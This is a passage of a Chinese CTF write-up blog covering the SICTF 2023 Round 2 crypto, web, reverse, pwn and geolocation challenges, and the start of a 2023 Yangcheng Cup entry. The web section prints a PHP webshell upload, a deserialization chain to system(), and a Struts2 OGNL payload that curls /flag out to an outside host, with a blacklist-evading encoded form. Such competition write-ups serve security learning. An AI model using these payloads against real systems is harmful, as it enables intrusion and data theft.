class="number">230</span>) + x</span><br><span class="line">pl = f.small_roots(X=<span class="number">2</span>^<span class="number">230</span>, beta=<span class="number">0.48</span>, epsilon=<span class="number">0.02</span>)[<span class="number">0</span>]</span><br><span class="line">p = (ph &lt;&lt; <span class="number">230</span>) + pl</span><br><span class="line"></span><br><span class="line">q = n//<span class="built_in">int</span>(p)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="签到题来咯！"><a href="#签到题来咯！" class="headerlink" title="签到题来咯！"></a>签到题来咯！</h3><p>Related Message Attack（Franklin-Reiter攻击），爆破小 $e$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, n, e</span>):</span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (<span class="number">114</span>*x+<span class="number">2333</span>)^e - c1</span><br><span class="line">    g2 = (<span class="number">514</span>*x+<span class="number">4555</span>)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> e &lt; <span class="number">2</span>^<span class="number">10</span>:</span><br><span class="line">    m = attack(c1, c2, n, e)</span><br><span class="line">    m = binascii.unhexlify(<span class="string">&quot;%x&quot;</span> % <span class="built_in">int</span>(m))</span><br><span class="line">    <span class="keyword">if</span> m.isascii():</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    e = next_prime(e)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># SICTF&#123;hhh!!franklin_reiter_is_easy&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h3><p>直接小 $e$ 攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = </span><br><span class="line">m = gmpy2.iroot(c,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;2ca8e589-4a31-4909-80f0-9ecfc8f8cb37&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h3><p>根据</p><p>$\begin{cases} h_1=a_1p+b_1q \newline h_2=a_2p+b_2q \end{cases}$</p><p>消掉 $p$，有 $(a_2b_1-a_1b_2)q=a_2h_1-a_1h_2$，由于 $a_1,a_2$ 为素数且 $a_1,a_2 \in [2^{12},2^{13})$，又 $\gcd(a_2h_1-a_1h_2,n)=q$，爆破 $a_1,a_2$ 即可求 $q$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">h1 = </span><br><span class="line">h2 = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">primes = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> Primes():</span><br><span class="line">    <span class="keyword">if</span> k&gt;=<span class="number">2</span>^<span class="number">12</span>:</span><br><span class="line">        primes.append(k)</span><br><span class="line">    <span class="keyword">if</span> k&gt;<span class="number">2</span>^<span class="number">13</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">        x = <span class="built_in">abs</span>(h1*primes[i]-h2*primes[j])</span><br><span class="line">        q = gcd(x,n)</span><br><span class="line">        <span class="keyword">if</span> q &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(primes[i],primes[j],q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5953 4241 8358483529150257619757085065272214074629139403939506404958882156637928949429486966229697771519458532207667137987443291952917150640467328461391364839768437</span></span><br></pre></td></tr></table></figure><p>常规解RSA，得flag：<code>SICTF&#123;452aebb6-9c16-441a-ac42-fc608bf6063f&#125;</code></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="签到-Include"><a href="#签到-Include" class="headerlink" title="[签到]Include"></a>[签到]Include</h3><p>PHP伪协议读 <code>/flag</code>：</p><p><code>?SICTF=php://filter/resource=/flag</code></p><p>​    </p><h3 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h3><p>POST <code>/?k%20e%20y=123%0a&amp;b=phpinfo();</code></p><p><code>command=print_r(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));</code></p><p>​    </p><h3 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h3><p>条件竞争。</p><p>上传 <code>1.php</code> ，内容为 <code>&lt;?php system(&quot;cat /flag&quot;);</code>，bp抓包；访问 <code>uploads/1.php</code> ，bp抓包。</p><p>上面两个包分别在bp intruder用null payloads爆破1000次，找到 <code>uploads/1.php</code> 爆破结果中响应码200的那个数据包，即为flag值。</p><p>​    </p><h3 id="pain"><a href="#pain" class="headerlink" title="pain"></a>pain</h3><p>Struts2基于OGNL的RCE漏洞，参考<a href="https://www.freebuf.com/vuls/217482.html">https://www.freebuf.com/vuls/217482.html</a></p><p>S2-012的payload可用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;curl http://[IP]:[PORT]/?p=`cat /flag`&quot;</span>&#125;)).start()</span><br></pre></td></tr></table></figure><p>unicode编码绕过黑名单关键字过滤，再根据源码的urldecode，urlencode一层，payload：</p><p><code>/start?payload=%5Cu0028%5Cu006e%5Cu0065%5Cu0077%5Cu0020%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0050%5Cu0072%5Cu006f%5Cu0063%5Cu0065%5Cu0073%5Cu0073%5Cu0042%5Cu0075%5Cu0069%5Cu006c%5Cu0064%5Cu0065%5Cu0072%5Cu0028%5Cu006e%5Cu0065%5Cu0077%5Cu0020%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0053%5Cu0074%5Cu0072%5Cu0069%5Cu006e%5Cu0067%5Cu005b%5Cu005d%5Cu007b%5Cu0022%5Cu0062%5Cu0061%5Cu0073%5Cu0068%5Cu0022%5Cu002c%5Cu0020%5Cu0022%5Cu002d%5Cu0063%5Cu0022%5Cu002c%5Cu0020%5Cu0022%5Cu0063%5Cu0075%5Cu0072%5Cu006c%5Cu0020%5Cu0068%5Cu0074%5Cu0074%5Cu0070%5Cu003a%5Cu002f%5Cu002f%5Cu0031%5Cu0032%5Cu0030%5Cu002e%5Cu0032%5Cu0035%5Cu002e%5Cu0031%5Cu0030%5Cu0034%5Cu002e%5Cu0032%5Cu0030%5Cu0039%5Cu003a%5Cu0038%5Cu0038%5Cu0038%5Cu0038%5Cu002f%5Cu003f%5Cu0070%5Cu003d%5Cu0060%5Cu0063%5Cu0061%5Cu0074%5Cu0020%5Cu002f%5Cu0066%5Cu006c%5Cu0061%5Cu0067%5Cu0060%5Cu0022%5Cu007d%5Cu0029%5Cu0029%5Cu002e%5Cu0073%5Cu0074%5Cu0061%5Cu0072%5Cu0074%5Cu0028%5Cu0029</code></p><p>得到结果：</p><p><code>210.44.151.51 - - [09/Sep/2023 12:30:07] &quot;GET /?p=SICTF169e8299-2241-4b2e-9726-1c32f212ca51 HTTP/1.1&quot; 200 -</code></p><p>​    </p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>POST <code>/</code></p><p><code>code=include &quot;/flag&quot;;</code></p><p>​    </p><h3 id="我全都要"><a href="#我全都要" class="headerlink" title="我全都要"></a>我全都要</h3><p>写反序列化链：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:</span><br><span class="line">    public_MyLover=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_i=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    public_nogame=P()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_Aec=B()</span><br><span class="line">    public_girl=[<span class="string">&#x27;1&#x27;</span>]</span><br><span class="line">    public_boy=[<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_pop=A()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(serialize(B()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:1:&quot;B&quot;:1:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:2:&#123;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;s:1:&quot;x&quot;;&#125;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;s:1:&quot;2&quot;;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;s:1:&quot;1&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>POST <code>?A_B_C=O:1:&quot;B&quot;:1:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:2:&#123;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;s:1:&quot;x&quot;;&#125;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;s:1:&quot;2&quot;;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;s:1:&quot;1&quot;;&#125;&#125;&#125;</code></p><p><code>cmd=system(&quot;cat /flag&quot;);</code></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="签到-PYC"><a href="#签到-PYC" class="headerlink" title="[签到]PYC"></a>[签到]PYC</h3><p>pyc反编译，得flag。</p><p><code>SICTF&#123;07e278e7-9d66-4d90-88fc-8bd61e490616&#125;</code></p><p>​    </p><h3 id="Myobject"><a href="#Myobject" class="headerlink" title="Myobject"></a>Myobject</h3><p>动调，发现是RC4，key为 <code>SIFLAG</code>，密文为 <code>3027D30E5A22CF47476B0BE58D53BA99C3850707011C7710FE889F</code>。</p><p>解密RC4，得flag：<code>SICTF&#123;wow_you_get_the_flag&#125;</code>。</p><p>​    </p><h3 id="chbase"><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h3><p>搜索字符串得</p><p>码表：<code>ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz0123456789+/</code></p><p>密文：<code>F0lWEVA7BmUzAGB0C2UuAU9hbnIpATEidDdnACQ9</code></p><p>base64解码得flag：<code>SICTF&#123;base64_and_antidebugger&#125;</code></p><p>​    </p><h3 id="不一样的base64"><a href="#不一样的base64" class="headerlink" title="不一样的base64"></a>不一样的base64</h3><p>pyinstxtractor解包得到111.pyc，反编译得到：</p><p><code>U0lDVEZ7OGUwZDM1OGQtOGI5ZC00ODY2LTliMDItNjc0OWIwN2FkMDlhfQAA</code></p><p>base64解码得flag：<code>SICTF&#123;8e0d358d-8b9d-4866-9b02-6749b07ad09a&#125;</code></p><p>​    </p><h3 id="javacode"><a href="#javacode" class="headerlink" title="javacode"></a>javacode</h3><p>JVM字节码，参考 <a href="https://zhuanlan.zhihu.com/p/412472914">两张图让你快速读懂JVM字节码指令</a> 理加密逻辑，已知key和密文c，关键运算为：</p><p><code>c[i] = (((m[i]^m[i+1])-k[i])^k[i])%256</code></p><p>还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">148</span>,<span class="number">136</span>,<span class="number">151</span>,<span class="number">234</span>,<span class="number">177</span>,<span class="number">48</span>,<span class="number">226</span>,<span class="number">234</span>,<span class="number">214</span>,<span class="number">177</span>,<span class="number">168</span>,<span class="number">176</span>,<span class="number">151</span>,<span class="number">250</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">253</span>,<span class="number">52</span>,<span class="number">72</span>,<span class="number">176</span>,<span class="number">170</span>,<span class="number">140</span>,<span class="number">176</span>,<span class="number">236</span>,<span class="number">54</span>,<span class="number">231</span>,<span class="number">212</span>,<span class="number">237</span>,<span class="number">135</span>,<span class="number">151</span>,<span class="number">150</span>,<span class="number">135</span>,<span class="number">217</span>,<span class="number">231</span>,<span class="number">229</span>,<span class="number">32</span>,<span class="number">90</span>]</span><br><span class="line">k = <span class="built_in">list</span>(<span class="string">b&#x27;SICTF2023&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;_&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">m = [<span class="number">83</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (((m[-<span class="number">1</span>]^j)-k[i%<span class="built_in">len</span>(k)])^k[i%<span class="built_in">len</span>(k)])%<span class="number">256</span> == c[i]:</span><br><span class="line">            m.append(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;OMG_j@vac0de_1s_sO_interesting!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="签到-Shop"><a href="#签到-Shop" class="headerlink" title="[签到]Shop"></a>[签到]Shop</h3><p>整数溢出漏洞，输入-1得flag。</p><p>​    </p><h2 id="FORENSICS"><a href="#FORENSICS" class="headerlink" title="FORENSICS"></a>FORENSICS</h2><h3 id="购物之旅"><a href="#购物之旅" class="headerlink" title="购物之旅"></a>购物之旅</h3><p>百度识图+关键字搜索。</p><p><code>SICTF&#123;北京市_顺义区_新顺南大街_北京华联顺义金街购物中心&#125;</code></p><p>​    </p><h3 id="天桥"><a href="#天桥" class="headerlink" title="天桥"></a>天桥</h3><p>辨认出梧桐树，再关键字搜索城市。</p><p><code>SICTF&#123;陕西省西安市碑林区友谊路&#125;</code></p><p>​    </p><h3 id="美女姐姐O-o"><a href="#美女姐姐O-o" class="headerlink" title="美女姐姐O.o"></a>美女姐姐O.o</h3><p>百度识图+关键字搜索。</p><p><code>SICTF&#123;福建省福州市仓山区烟台山公园&#125;</code></p><p>​    </p><h3 id="宝塔镇河妖"><a href="#宝塔镇河妖" class="headerlink" title="宝塔镇河妖"></a>宝塔镇河妖</h3><p>百度识图+关键字搜索。</p><p><code>SICTF&#123;山东省济宁市汶上县太子灵踪塔&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;SICTF2023 #Round2 是杭州电子科技大学信息工程学院和广东海洋大学联合举办的网络安全赛。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Rank: 4&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; c</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2023年羊城杯网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2023/09/02/match-2023%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2023/09/02/match-2023%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2023-09-02T15:19:34.000Z</published>
    <updated>2023-09-03T02:23:43.500Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>竞赛时间</p><p>2023-09-02 09:00:00~2023-09-03 09:00:00</p><p>竞赛简介</p><p>目前我国网民规模已突破9亿，成为名副其实的网络大国，但我国与网络强国相比还有一定距离。习近平总书记指出：要建立高素质网络安全和信息化人才队伍，将我国建设成网络强国。建设网络强国需要高素质的网络安全和信息化人才队伍。网络安全人才是国家网络安全建设的核心资源，其数量、质量和结构是衡量国家网络安全软实力和竞争力的重要标志。 为积极响应国家网络强国建设对网络安全人才的需求，提升人民的网络安全知识水平和实践力，特举办2023年“羊城杯”网络安全大赛。</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="EZ-misc"><a href="#EZ-misc" class="headerlink" title="EZ_misc"></a>EZ_misc</h3><blockquote><p>一道简单的misc捏..</p></blockquote><p>16进制查看，末尾修改 <code>504b0403</code> 为 <code>504b0304</code> 后提取出zip文件，得到一串密文 <code>vzbtrvplnnvphsqkxsiqibroou</code>。</p><p>根据图片名Grons和压缩包内文件名feld，组合得到Gronsfeld为一种密码，爆破密钥得到提示：<code>try to think the s nipping tools</code>，为Win10/11截图工具漏洞aCropalypse（CVE-2023-28303）。</p><p>利用<a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">Acropalypse Multi Tool工具</a>修复png宽高，还原得到flag：</p><p><img src="/2023/09/02/match-2023%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20230903014924226.png" alt="image-20230903014924226"></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Danger-RSA"><a href="#Danger-RSA" class="headerlink" title="Danger_RSA"></a>Danger_RSA</h3><blockquote><p>看似简单的rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>(<span class="params">a, nbit</span>):</span><br><span class="line">    <span class="keyword">assert</span> a &gt;= <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        X = getRandomInteger(nbit // a)</span><br><span class="line">        s = getRandomRange(<span class="built_in">pow</span>(<span class="number">2</span>, a ** <span class="number">2</span> - a + <span class="number">4</span>), <span class="built_in">pow</span>(<span class="number">2</span>, a ** <span class="number">2</span> - a + <span class="number">5</span>))</span><br><span class="line">        p = X ** a + s</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> (p, s)</span><br><span class="line"></span><br><span class="line">p, s = get_key(a, <span class="number">1024</span>)</span><br><span class="line">q, t = get_key(a, <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line">e = s * t</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;N =&quot;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="comment"># N = 20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></span><br><span class="line"><span class="comment"># e = 11079917583</span></span><br><span class="line"><span class="comment"># c = 13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>$N$ 为2038位，$p,q$ 至少为1024位，且生成函数 <code>get_key()</code> 的 $p=X^a+s$ 有 $X^a \gt\gt s$，且 $e$ 为34位，$s&lt;e$，故 $a$ 值不会太大，尝试爆破 $a$ 值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></span><br><span class="line">e = <span class="number">11079917583</span></span><br><span class="line">c = <span class="number">13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>(<span class="params">a, nbit</span>):</span><br><span class="line">    <span class="keyword">assert</span> a &gt;= <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        X = getRandomInteger(nbit // a)</span><br><span class="line">        s = <span class="built_in">pow</span>(<span class="number">2</span>, a ** <span class="number">2</span> - a + <span class="number">5</span>) <span class="comment"># 取可能的最大值</span></span><br><span class="line">        p = X ** a + s</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> (p, s)</span><br><span class="line">     </span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">20</span>):</span><br><span class="line">    p, s = get_key(a,<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> s.bit_length() &lt; <span class="number">34</span>: <span class="comment"># s &lt; e</span></span><br><span class="line">        <span class="built_in">print</span>(a, p.bit_length(), s.bit_length())</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 2 1021 8</span></span><br><span class="line"><span class="comment"># 3 1012 12</span></span><br><span class="line"><span class="comment"># 4 1020 18</span></span><br></pre></td></tr></table></figure><p>$a=4$ 时满足 $e=s \cdot t$ 的位数条件，有 $s \in [2^{a^2-a+4},2^{a^2-a+5})=[65536,131072)$。</p><p>分解 $e$，尝试其各因子，求 $s,t$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">4</span></span><br><span class="line"><span class="comment"># s ~ (65536,131072)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e = 3 · 7^2 · 19 · 691 · 5741</span></span><br><span class="line">ed = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">49</span>, <span class="number">57</span>, <span class="number">133</span>, <span class="number">147</span>, <span class="number">399</span>, <span class="number">691</span>, <span 